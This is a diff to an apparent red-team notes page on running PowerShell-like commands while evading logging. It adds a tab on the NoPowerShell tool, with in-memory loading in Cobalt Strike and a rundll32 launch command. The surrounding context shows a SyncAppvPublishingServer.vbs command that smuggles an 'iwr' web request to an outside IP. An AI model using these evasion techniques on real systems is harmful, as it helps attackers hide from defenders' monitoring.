@@ -37,6 +37,16 @@ Windows 10 comes with SyncAppvPublishingServer.exe and SyncAppvPublishingServer.
 C:\Users\v4resk> SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 ```
 {% endtab %}
+
+{% tab title="NoPowershell" %}
+[NoPowerShell](https://github.com/bitsadmin/nopowershell) is a tool implemented in C# which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms.
+
+This .NET Framework 2 compatible binary can be loaded in Cobalt Strike to execute commands in-memory. No `System.Management.Automation.dll` is used; only native .NET libraries. An alternative usecase for NoPowerShell is to launch it as a DLL via rundll32.exe:&#x20;
+
+```powershell
+rundll32 NoPowerShell.dll,main
+```
+{% endtab %}
 {% endtabs %}
 
 ## Resources
